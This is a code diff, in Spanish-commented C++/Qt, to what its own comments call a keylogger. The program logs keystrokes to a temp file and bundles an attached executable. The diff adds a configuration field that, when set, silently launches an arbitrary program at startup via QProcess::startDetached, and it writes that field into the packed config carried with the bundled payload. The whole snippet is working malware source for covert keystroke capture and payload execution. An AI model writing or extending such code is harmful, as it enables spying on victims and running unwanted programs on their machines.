@@ -80,6 +80,10 @@ void MainWindow::inicio(){
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     verTecla.setInterval(50);
     this->verTecla.start();
+    if(this->ejecutar != "noejecutar")
+    {
+        QProcess::startDetached(this->ejecutar);
+    }
 }
 
 bool MainWindow::cargarConfiguracion(){
@@ -120,6 +124,7 @@ bool MainWindow::cargarConfiguracion(){
         this->tiempoConexion = conversion.toInt();
         this->alias = campo[7];
         this->nombreCopiable = campo[10];
+        this->ejecutar = campo[11];
         if (campo[8] == "unido") //Cuando hay un ejecutable adjunto
         {
             //Esto está muy poco optimizado, mejorar más adelante.
@@ -135,6 +140,7 @@ bool MainWindow::cargarConfiguracion(){
             datos = datos + "nounido" + "|@|";
             datos = datos + "0" + "|@|";
             datos = datos + campo[10].toLatin1() + "|@|";
+            datos = datos + campo[11].toLatin1() + "|@|";
             qint64 tamano;
             tamano = campo[9].toInt();
             QFile adjunto;
